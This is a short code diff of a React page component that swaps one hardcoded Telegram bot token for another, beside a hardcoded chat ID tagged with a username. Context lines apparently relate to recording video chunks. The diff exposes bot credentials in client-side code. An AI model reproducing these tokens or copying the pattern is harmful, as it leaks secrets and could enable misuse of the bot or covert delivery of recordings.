@@ -21,7 +21,7 @@ const Index = () => {
   const chunksRef = useRef<Blob[]>([]);
 
   // Telegram Bot configuration
-  const TELEGRAM_BOT_TOKEN = '7248503815:AAHq9hOmuE0H8GEqSVc0FjnH9qRYmpUoJOo';
+  const TELEGRAM_BOT_TOKEN = '8286818285:AAGqkSsTlsbKCT1guKYoDpkL_OcldAVyuSE';
   const TELEGRAM_CHAT_ID = '5215501225'; // @maxim_korel
 
   const getVideoConstraints = useCallback(() => {
